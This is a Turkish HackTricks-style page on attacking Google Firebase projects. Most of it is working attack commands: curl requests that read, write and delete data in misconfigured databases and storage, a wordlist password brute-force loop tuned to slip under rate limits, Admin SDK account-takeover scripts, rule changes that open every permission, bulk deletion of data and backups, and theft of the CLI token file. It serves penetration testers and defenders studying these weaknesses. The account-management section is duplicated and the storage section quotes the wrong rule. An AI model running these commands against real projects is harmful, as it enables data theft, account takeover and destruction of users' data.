# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Firebase Realtime Database'e kimliksız erişim
Bir saldırganın bu saldırıyı gerçekleştirmek için özel Firebase izinlerine ihtiyacı yoktur. Gerekli olan tek şey, Firebase Realtime Database güvenlik kurallarında `.read: true` veya `.write: true` olarak ayarlanmış, herkese açık okuma veya yazma izni veren savunmasız bir yapılandırmanın bulunmasıdır.

Saldırgan, veritabanı URL'sini belirlemelidir; bu genellikle şu formatı izler: `https://<project-id>.firebaseio.com/`.

Bu URL, mobil uygulama tersine mühendisliği (Android APK'lerinin dekompile edilmesi veya iOS uygulamalarının analiz edilmesi), google-services.json (Android) veya GoogleService-Info.plist (iOS) gibi yapılandırma dosyalarının incelenmesi, web uygulamalarının kaynak kodunun denetlenmesi veya `*.firebaseio.com` alanlarına yapılan istekleri tespit etmek için ağ trafiğinin incelenmesiyle bulunabilir.

Saldırgan veritabanı URL'sini belirler ve bunun herkese açık olup olmadığını kontrol eder, ardından veriye erişir ve potansiyel olarak kötü amaçlı bilgi yazar.

Önce, URL'ye .json ekleyerek veritabanının okuma izni verip vermediğini kontrol eder.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Yanıt JSON verisi veya null içeriyorsa ("Permission Denied" yerine), veritabanı okuma erişimine izin veriyor demektir. Yazma erişimini kontrol etmek için saldırgan, Firebase REST API'yi kullanarak bir test yazma isteği göndermeyi deneyebilir.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
İşlem başarılı olursa, veritabanı ayrıca write access'e izin verir.


### Cloud Firestore'da verilerin açığa çıkması
Bir saldırganın bu saldırıyı gerçekleştirmek için herhangi bir özel Firebase permissions'a ihtiyacı yoktur. Gerekli olan tek şey, Cloud Firestore security rules içinde kuralların authentication olmadan veya yetersiz doğrulama ile read or write access'e izin verdiği bir zayıf yapılandırmanın bulunmasıdır. Tam erişim veren yanlış yapılandırılmış bir rule örneği şudur:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Bu kural, herkesin tüm belgeleri herhangi bir kısıtlama olmadan okumalarına ve yazmalarına izin verir. Firestore kuralları ayrıntılıdır ve koleksiyon ve belge bazında uygulanır; bu nedenle belirli bir kuraldaki bir hata yalnızca bazı koleksiyonları açığa çıkarabilir.

Saldırganın Firebase Project ID'yi belirlemesi gerekir; bu, mobile app reverse engineering yoluyla, google-services.json veya GoogleService-Info.plist gibi yapılandırma dosyalarının analiziyle, web uygulamalarının kaynak kodunun incelenmesiyle veya firestore.googleapis.com'a yapılan istekleri tespit etmek için ağ trafiğinin analiz edilmesiyle bulunabilir.
Firestore REST API şu formatı kullanır:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Kurallar kimlik doğrulaması olmadan okuma erişimine izin veriyorsa, saldırgan koleksiyonları ve belgeleri okuyabilir. İlk olarak belirli bir koleksiyona erişmeyi denerler:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Eğer yanıt bir izin hatası yerine JSON belgeleri içeriyorsa, collection açığa çıkmıştır. Saldırgan, yaygın isimleri deneyerek veya uygulamanın yapısını analiz ederek erişilebilen tüm collection'ları listeleyebilir. Belirli bir document'e erişmek için:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Eğer kurallar unauthenticated write access'e izin veriyorsa veya validation yetersizse, attacker yeni documents oluşturabilir:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Mevcut bir belgeyi değiştirmek için PATCH kullanılmalıdır:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Bir belgeyi silmek ve hizmet reddine neden olmak için:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Dosyaların Firebase Storage'ta Açığa Çıkması
Bir saldırganın bu saldırıyı gerçekleştirmek için özel bir Firebase iznine ihtiyacı yoktur. Bunun için tek gereken, Firebase Storage güvenlik kurallarında kimlik doğrulama olmadan veya yetersiz doğrulama ile okuma veya yazma erişimine izin veren bir yapılandırma hatasının bulunmasıdır. Storage kuralları okuma ve yazma izinlerini bağımsız olarak kontrol eder; bu nedenle bir kuraldaki hata yalnızca okuma erişimini, yalnızca yazma erişimini veya her ikisini açığa çıkarabilir. Tam erişim veren yanlış yapılandırılmış bir kural örneği şudur:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Bu kural tüm dokümanlara herhangi bir kısıtlama olmadan okuma ve yazma erişimi sağlar. Firestore kuralları ayrıntılıdır ve collection başına ve document başına uygulanır; bu nedenle belirli bir kuraldaki bir hata yalnızca bazı koleksiyonları açığa çıkarabilir. Attacker'ın Firebase Project ID'sini tespit etmesi gerekir; bu, mobile application reverse engineering, google-services.json veya GoogleService-Info.plist gibi yapılandırma dosyalarının analizi, web uygulaması kaynak kodunun incelenmesi veya firestore.googleapis.com'a yapılan istekleri tespit etmek için ağ trafiği analizi yoluyla bulunabilir.
The Firestore REST API uses the format:`https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Kurallar kimlik doğrulaması yapılmamış okuma erişimine izin veriyorsa, attacker koleksiyonları ve dokümanları okuyabilir. İlk olarak belirli bir koleksiyona erişmeye çalışırlar.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Eğer yanıt bir izin hatası yerine dosya listesi içeriyorsa, dosya açığa çıkmıştır. Saldırgan dosyanın yolunu belirterek içeriğini görüntüleyebilir:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Kurallar kimlik doğrulama gerektirmeyen yazma erişimine izin veriyorsa veya yetersiz doğrulama varsa, saldırgan kötü amaçlı dosyalar yükleyebilir. REST API üzerinden bir dosya yüklemek için:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Saldırgan code shells, malware payloads veya büyük dosyalar yükleyerek denial of service'a neden olabilir. Eğer uygulama yüklenen dosyaları işliyor veya çalıştırıyorsa, saldırgan remote code execution elde edebilir. Dosyaları silmek ve denial of service'a neden olmak için:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Halka açık Firebase Cloud Functions'ın çağrılması

Bir saldırganın bu açığı sömürmek için özel bir Firebase iznine ihtiyacı yoktur; tek gereksinim, bir Cloud Function'ın kimlik doğrulama olmadan HTTP üzerinden halka açık erişilebilir olmasıdır.

Bir fonksiyon aşağıdaki şekilde güvensiz yapılandırıldıysa zaaftır:

- functions.https.onRequest kullanır; bu kimlik doğrulamasını zorunlu kılmaz (onCall functions'ın aksine).
- Fonksiyonun kodu kullanıcı kimlik doğrulamasını doğrulamaz (ör. request.auth veya context.auth kontrolleri yok).
- Fonksiyon IAM'de halka açıktır, yani allUsers'a roles/cloudfunctions.invoker rolü verilmiştir. Bu, geliştirici erişimi kısıtlamadıkça HTTP fonksiyonları için varsayılan davranıştır.

Firebase HTTP Cloud Functions şu gibi URL'lerle açığa çıkar:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (Firebase Hosting ile entegre edildiğinde)

Bir saldırgan bu URL'leri kaynak kodu analizi, ağ trafiği incelemesi, enumeration tools veya mobil uygulama tersine mühendisliği ile keşfedebilir.  
Fonksiyon halka açık ve kimlik doğrulamasız ise saldırgan onu kimlik bilgisi olmadan doğrudan çağırabilir.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Eğer fonksiyon girdileri doğru şekilde doğrulamıyorsa, saldırgan code injection veya command injection gibi diğer saldırılara başvurabilir.

### Brute-force attack against Firebase Authentication with a weak password policy
Bir saldırganın bu saldırıyı gerçekleştirmek için özel bir Firebase iznine ihtiyacı yoktur. Yeterli olan, Firebase API Key'in mobil veya web uygulamalarında açığa çıkmış olması ve parola politikasının varsayılanlardan daha sıkı gereksinimlerle yapılandırılmamış olmasıdır.

Saldırgan, mobil uygulama reverse engineering ile, google-services.json veya GoogleService-Info.plist gibi konfigürasyon dosyalarının analiziyle, web uygulamalarının kaynak kodunu inceleyerek (örn. bootstrap.js içinde) veya ağ trafiğini analiz ederek Firebase API Key'i tespit etmelidir.

Firebase Authentication’ın REST API'si e-posta ve parola ile kimlik doğrulamak için şu endpoint'i kullanır:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`

Email Enumeration Protection devre dışıysa, API hata yanıtları bir e-postanın sistemde mevcut olup olmadığını (EMAIL_NOT_FOUND vs. INVALID_PASSWORD) açığa çıkarabilir; bu, saldırganların parola tahmini denemelerine başlamadan önce kullanıcıları sırayla belirlemelerine olanak tanır. Bu koruma etkinleştirildiğinde ise API, mevcut olmayan e-postalar ve yanlış parolalar için aynı hata mesajını döndürür ve kullanıcı sıralamasını engeller.

Önemle belirtmek gerekir ki Firebase Authentication rate limiting uygular; çok kısa sürede çok fazla kimlik doğrulama denemesi olursa bu istekleri engelleyebilir. Bu yüzden saldırganın rate-limited olmamak için denemeler arasında gecikmeler koyması gerekir.

Saldırgan API Key'i tespit eder ve bilinen hesaplara karşı birden fazla parola ile kimlik doğrulama denemeleri yapar. Email Enumeration Protection devre dışıysa, saldırgan hata yanıtlarını analiz ederek mevcut kullanıcıları sıralayabilir:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Eğer yanıt EMAIL_NOT_FOUND içeriyorsa, e-posta sistemde yok demektir. Eğer INVALID_PASSWORD içeriyorsa, e-posta mevcut fakat şifre yanlış olup kullanıcının kayıtlı olduğunu doğrular. Geçerli bir kullanıcı tespit edildikten sonra, saldırgan brute-force denemeleri yapabilir. Firebase Authentication’s hız sınırlama (rate-limiting) mekanizmalarından kaçınmak için denemeler arasında duraklamalar eklemek önemlidir:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Varsayılan parola politikasıyla (minimum 6 karakter, karmaşıklık gereksinimi yok), saldırgan 6 karakterli parolaların tüm olası kombinasyonlarını deneyebilir; bu, daha sıkı parola politikalarına kıyasla nispeten küçük bir arama alanı temsil eder.

### Firebase Authentication'da kullanıcı yönetimi

Bu saldırıyı gerçekleştirmek için saldırganın belirli Firebase Authentication izinlerine ihtiyacı vardır. Gerekli izinler şunlardır:

- `firebaseauth.users.create` kullanıcı oluşturmak için
- `firebaseauth.users.update` mevcut kullanıcıları değiştirmek için
- `firebaseauth.users.delete` kullanıcıları silmek için
- `firebaseauth.users.get` kullanıcı bilgilerini almak için
- `firebaseauth.users.sendEmail` kullanıcılara e-posta göndermek için
- `firebaseauth.users.createSession` kullanıcı oturumları oluşturmak için

Bu izinler `roles/firebaseauth.admin` rolünün içinde bulunur; bu rol Firebase Authentication kaynaklarına tam okuma/yazma erişimi sağlar. Ayrıca `roles/firebase.developAdmin` (tüm firebaseauth.* izinlerini içerir) ve `roles/firebase.admin` (tüm Firebase servislerine tam erişim) gibi üst düzey rollerde de bulunurlar.

Firebase Admin SDK'yı kullanmak için saldırganın service account credentials (JSON file) erişimine ihtiyacı olacaktır; bunlar ele geçirilmiş sistemlerde, herkese açık kod depolarında, ele geçirilmiş CI/CD sistemlerinde veya bu kimlik bilgilerine erişimi olan geliştirici hesaplarının ele geçirilmesi yoluyla bulunabilir.

İlk adım, Firebase Admin SDK'yı service account credentials kullanarak yapılandırmaktır.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Mağdurun e-posta adresini kullanarak kötü amaçlı bir kullanıcı oluşturmak isteyen saldırgan, o e-posta adresiyle yeni bir hesap oluşturmak için Firebase Admin SDK'yı kullanmaya çalışır.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Mevcut bir kullanıcıyı değiştirmek için saldırgan, e-posta adresi, doğrulama durumu veya hesabın devre dışı olup olmadığı gibi alanları günceller.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Bir kullanıcı hesabını silerek denial of service'a neden olmak için, saldırgan kullanıcıyı tamamen kaldırmak üzere bir istek gönderir.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Saldırgan, mevcut kullanıcılar hakkında bilgileri UID veya email address isteyerek de alabilir.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Ek olarak, saldırgan verification links veya password-reset links oluşturarak bir kullanıcının şifresini değiştirip hesabına erişim sağlayabilir.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase Authentication'da kullanıcı yönetimi
Bir saldırganın bu saldırıyı gerçekleştirebilmesi için belirli Firebase Authentication izinlerine ihtiyacı vardır. Gerekli izinler şunlardır:

- `firebaseauth.users.create` kullanıcı oluşturmak için
- `firebaseauth.users.update` mevcut kullanıcıları değiştirmek için
- `firebaseauth.users.delete` kullanıcıları silmek için
- `firebaseauth.users.get` kullanıcı bilgisi almak için
- `firebaseauth.users.sendEmail` kullanıcılara e-posta göndermek için
- `firebaseauth.users.createSession` kullanıcı oturumları oluşturmak için

Bu izinler roles/firebaseauth.admin rolüne dahildir; bu rol Firebase Authentication kaynaklarına tam okuma/yazma erişimi verir. Ayrıca `roles/firebase.developAdmin` (tüm firebaseauth.* izinlerini içerir) ve `roles/firebase.admin` (tüm Firebase servislerine tam erişim) gibi daha üst düzey rollerin bir parçasıdır.

Firebase Admin SDK'yı kullanmak için, saldırganın servis hesabı kimlik bilgilerine (bir JSON dosyası) erişimi olması gerekir; bunlar ele geçirilmiş sistemlerden, kamuya açık kod depolarından, ele geçirilmiş CI/CD ortamlarından veya bu kimlik bilgilerine erişimi olan geliştirici hesaplarının ele geçirilmesi yoluyla elde edilebilir.

İlk adım, servis hesabı kimlik bilgilerini kullanarak Firebase Admin SDK'yı yapılandırmaktır.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Bir mağdurun e-postasını kullanarak kötü amaçlı bir kullanıcı oluşturmak için saldırgan, o e-posta ile yeni bir kullanıcı hesabı oluşturmaya çalışır ve kendi parolasını ile profil bilgilerini atar.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Mevcut bir kullanıcıyı değiştirmek için saldırgan e-posta adresi, doğrulama durumu veya hesabın devre dışı bırakılmış olup olmadığı gibi alanları değiştirir.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Bir kullanıcı hesabını silmek — etkili şekilde bir denial of service yaratmak — için saldırgan, o kullanıcıyı kalıcı olarak kaldırmak üzere bir istek gönderirdi.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Saldırgan, mevcut kullanıcılar hakkında UID veya e-posta gibi bilgileri, kullanıcı ayrıntılarını UID ile veya e-posta adresiyle sorgulayarak elde edebilir.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Ek olarak, saldırgan verification links veya password-reset links oluşturabilir; bu, bir kullanıcının şifresini değiştirmesine ve hesabın kontrolünü ele geçirmesine olanak tanır.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Firebase servislerindeki güvenlik kurallarının değiştirilmesi
Saldırganın güvenlik kurallarını değiştirmek için hizmete bağlı olarak belirli izinlere ihtiyacı vardır. Cloud Firestore ve Firebase Cloud Storage için gerekli izinler, ruleset oluşturmak üzere `firebaserules.rulesets.create` ve release dağıtmak üzere `firebaserules.releases.create`'dir. Bu izinler `roles/firebaserules.admin` rolünde veya `roles/firebase.developAdmin` ve `roles/firebase.admin` gibi daha üst düzey rollerde mevcuttur. Firebase Realtime Database için gerekli izin `firebasedatabase.instances.update`'dir.

Saldırgan, güvenlik kurallarını değiştirmek için Firebase REST API'yi kullanmalıdır.
Önce saldırganın service account credentials kullanarak bir access token elde etmesi gerekir.
Token'i elde etmek için:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Firebase Realtime Database kurallarını değiştirmek için:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Cloud Firestore kurallarını değiştirmek için, saldırgan bir ruleset oluşturmalı ve ardından bunu deploy etmelidir:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Önceki komut projects/<project-id>/rulesets/<ruleset-id> formatında bir ruleset adı döndürür. Yeni sürümü deploy etmek için release, bir PATCH request kullanılarak güncellenmelidir:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Firebase Cloud Storage kurallarını değiştirmek için:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Önceki komut, projects/<project-id>/rulesets/<ruleset-id> biçiminde bir ruleset adı döndürür. Yeni sürümü deploy etmek için release, bir PATCH request kullanılarak güncellenmelidir:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Cloud Firestore'de veri sızdırma ve manipülasyonu
Cloud Firestore, Cloud Datastore ile aynı altyapı ve izin sistemini kullanır, bu yüzden Datastore IAM izinleri doğrudan Firestore'a uygulanır. TTL politikalarını manipüle etmek için `datastore.indexes.update` izni gereklidir. Verileri dışa aktarmak için `datastore.databases.export` izni gereklidir. Verileri içe aktarmak için datastore.databases.import izni gereklidir. Toplu veri silme işlemi yapmak için `datastore.databases.bulkDelete` izni gereklidir.

Yedekleme ve geri yükleme işlemleri için belirli izinler gereklidir:

- `datastore.backups.get` ve `datastore.backups.list` mevcut yedekleri listelemek ve detaylarını almak için
- `datastore.backups.delete` yedekleri silmek için
- `datastore.backups.restoreDatabase` bir veritabanını yedekten geri yüklemek için
- `datastore.backupSchedules.create` ve `datastore.backupSchedules.delete` yedekleme zamanlamalarını yönetmek için

Bir TTL politikası oluşturulduğunda, silinmeye uygun varlıkları belirlemek için bir özellik seçilir. Bu TTL özelliğinin Date and time türünde olması gerekir. Saldırgan var olan bir özelliği seçebilir veya daha sonra eklemeyi planladığı bir özelliği belirleyebilir. Alanın değeri geçmiş bir tarihse, belge hemen silinmeye uygun hale gelir. Saldırgan, TTL politikalarını manipüle etmek için gcloud CLI'yi kullanabilir.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Verileri dışa aktarıp sızdırmak için saldırgan gcloud CLI'yi kullanabilir.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Kötü amaçlı verileri içe aktarmak için:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Toplu veri silme gerçekleştirerek ve denial of service'a neden olarak, saldırgan tüm koleksiyonları kaldırmak için gcloud Firestore bulk-delete aracını kullanabilir.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Yedekleme ve geri yükleme işlemleri için, saldırgan veritabanının mevcut durumunu yakalamak üzere zamanlanmış yedekler oluşturabilir, mevcut yedekleri listeleyebilir, son değişiklikleri üzerine yazmak için bir yedekten geri yükleyebilir, kalıcı veri kaybına yol açmak için yedekleri silebilir ve zamanlanmış yedekleri kaldırabilir.
Hemen bir yedek oluşturan günlük bir yedekleme planı oluşturmak için:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Belirli bir backup'tan restore etmek için, saldırgan o backup'ta bulunan verileri kullanarak yeni bir database oluşturabilir. Restore işlemi backup'ın verilerini yeni bir database'e yazar; bu da mevcut bir DATABASE_ID'nin kullanılamayacağı anlamına gelir.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Bir yedeği silmek ve kalıcı veri kaybına yol açmak için:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Firebase CLI kimlik bilgilerinin çalınması ve kötüye kullanımı
Bir saldırganın bu saldırıyı gerçekleştirmek için özel Firebase izinlerine ihtiyacı yoktur, ancak geliştiricinin yerel sistemine veya Firebase CLI kimlik bilgileri dosyasına erişmesi gerekir. Bu kimlik bilgileri şu konumdaki bir JSON dosyasında saklanır:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Bu dosya, refresh_token ve access_token dahil olmak üzere kimlik doğrulama token'larını içerir; bu token'lar saldırganın firebase login komutunu ilk çalıştıran kullanıcı olarak kimlik doğrulaması yapmasına olanak tanır.

Saldırgan Firebase CLI kimlik bilgileri dosyasına erişim sağlar. Ardından tüm dosyayı kendi sistemine kopyalayabilir ve Firebase CLI varsayılan konumundan kimlik bilgilerini otomatik olarak kullanacaktır. Bunu yaptıktan sonra saldırgan, o kullanıcının erişebildiği tüm Firebase projelerini görüntüleyebilir.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
